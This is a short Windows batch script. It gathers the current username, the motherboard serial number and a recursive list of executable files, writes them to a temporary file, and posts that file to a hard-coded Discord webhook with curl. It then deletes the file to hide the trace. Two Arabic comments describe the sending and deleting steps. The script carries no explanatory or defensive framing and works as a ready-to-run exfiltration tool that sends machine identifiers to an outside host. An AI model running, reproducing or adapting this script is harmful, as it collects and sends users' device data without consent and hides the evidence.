@echo off
set "WEBHOOK_URL=https://discord.com/api/webhooks/1458999327606440138/5QZZ2D_KlWo4WSXiCEq78mNZN0otFEPqXWfMERFljvPSgBQC9I8cEgIjmX28CVA1PaAX"
set "TEMP_FILE=%TEMP%\Result.txt"

echo === Device Info === > "%TEMP_FILE%"
echo Username: %USERNAME% >> "%TEMP_FILE%"
echo Motherboard ID: >> "%TEMP_FILE%"
wmic baseboard get serialnumber | findstr /V "SerialNumber" >> "%TEMP_FILE%"

echo. >> "%TEMP_FILE%"
echo === Folder Contents (EXE) === >> "%TEMP_FILE%"
dir /b /s *.exe >> "%TEMP_FILE%"

:: إرسال الملف إلى Discord باستخدام curl
curl -X POST -H "Content-Type: multipart/form-data" ^
     -F "file=@%TEMP_FILE%" ^
     %WEBHOOK_URL%

:: حذف الملف المؤقت بعد الإرسال
del "%TEMP_FILE%"
exit